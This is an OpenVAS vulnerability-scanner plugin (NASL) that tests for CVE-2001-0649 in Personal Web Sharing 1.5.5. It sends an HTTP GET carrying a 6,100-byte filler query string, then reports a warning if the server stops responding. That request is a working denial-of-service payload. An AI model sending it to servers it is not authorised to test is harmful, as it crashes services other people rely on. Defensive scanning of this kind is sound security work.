# OpenVAS Vulnerability Test
# $Id: PWS_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Personal Web Sharing overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the Personal Web Sharing
service by sending it a too long request.

A cracker may exploit this vulnerability to make your web server
crash continually.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# To: BUGTRAQ@SECURITYFOCUS.COM
# Subject: Personal Web Sharing remote stop
# Date: Thu, 10 May 2001 07:32:43 +0200 (EET)
# Frok: "Jass Seljamaa" <jass@email.isp.ee>
#
# Affected:
# Personal Web sharing v1.5.5

if(description)
{
 script_id(11085);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2001-0649");
 script_bugtraq_id(2715, 84);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 name = "Personal Web Sharing overflow ";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Too long request kills PWS";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

########

include("http_func.inc");



port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

r= http_get(item:string("/?", crap(6100)), port:port);
send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);


if(http_is_dead(port: port)) { security_warning(port); }